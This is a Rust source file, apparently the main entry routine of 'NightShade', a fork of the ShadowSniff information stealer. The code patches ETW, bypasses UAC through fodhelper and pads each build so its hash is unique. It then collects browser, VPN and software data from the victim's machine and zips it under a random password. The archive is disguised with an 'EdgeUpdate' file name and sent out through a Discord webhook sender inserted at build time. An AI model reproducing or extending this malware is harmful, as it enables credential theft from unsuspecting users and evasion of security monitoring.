/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use alloc::format;
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::atomic::AtomicCollector;
use collector::display::PrimitiveDisplayCollector;
use collector::{Browser, Collector, Software, Vpn};
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::virtualfs::VirtualFileSystem;
use ipinfo::{IpInfo, init, unwrapped_ip_info};
use sender::discord_webhook::DiscordWebhookSender;
use sender::{LogSender, LogSenderExt};
use nightshade::SniffTask;
use tasks::Task;
use utils::get_time_nanoseconds;
use utils::pc_info::PcInfo;
use zip::ZipArchive;

#[inline(always)]
pub fn run() {
    include!(env!("BUILDER_START_DELAY"));

    // Best-effort runtime hardening: direct syscalls + ETW patch.
    evade::harden();

    // Auto-elevation (fodhelper route): when running non-elevated, hand off
    // to an elevated copy; on any bypass failure keep going as-is so
    // collection never dies over an evasion miss.
    if !evade::uac::ensure_elevated() {
        return;
    }

    // Per-build random padding: keeps every stub hash unique.
    mod builder_pad {
        include!(env!("BUILDER_PAD_EXPR"));
    }
    core::hint::black_box(&builder_pad::BUILDER_PAD);

    // Geo-IP is best-effort: if both APIs fail, unwrapped_ip_info() falls
    // back to Unknown placeholders instead of killing the run and silently
    // losing everything collected so far.
    let _ = init();

    #[cfg(feature = "message_box_before_execution")]
    include!(env!("BUILDER_MESSAGE_BOX_EXPR"));

    let fs = VirtualFileSystem::default();
    let out = &Path::new("\\output");
    let _ = fs.mkdir(out);

    let collector = AtomicCollector::default();

    SniffTask::default().run(out, &fs, &collector);

    let password: String = {
        // Larger alphabet + xorshift re-seeded with PID: no more 22-char
        // charset with a wall-clock-only seed.
        const CHARSET: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%^&*";

        let mut seed = utils::get_time_nanoseconds() as u64
            ^ ((unsafe { windows_sys::Win32::System::Threading::GetCurrentProcessId() } as u64)
                << 48);

        let mut next = move || {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            seed
        };

        (0..32)
            .map(|_| CHARSET[(next() as usize) % CHARSET.len()] as char)
            .collect()
    };

    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));

    include!(env!("BUILDER_CONSIDER_EMPTY_EXPR"));

    let _zip = ZipArchive::default()
        .add_folder_content(&fs, out)
        .password(password)
        .comment(displayed_collector);

    let _log_name = generate_log_name();

    include!(env!("BUILDER_SENDER_EXPR"));

    #[cfg(feature = "message_box_after_execution")]
    include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
}

fn generate_log_name() -> Arc<str> {
    let PcInfo {
        computer_name,
        user_name,
        ..
    } = PcInfo::retrieve();

    let IpInfo { country, .. } = unwrapped_ip_info();

    format!("[{country}] EdgeUpdate-{computer_name}-{user_name}.zip").into()
}
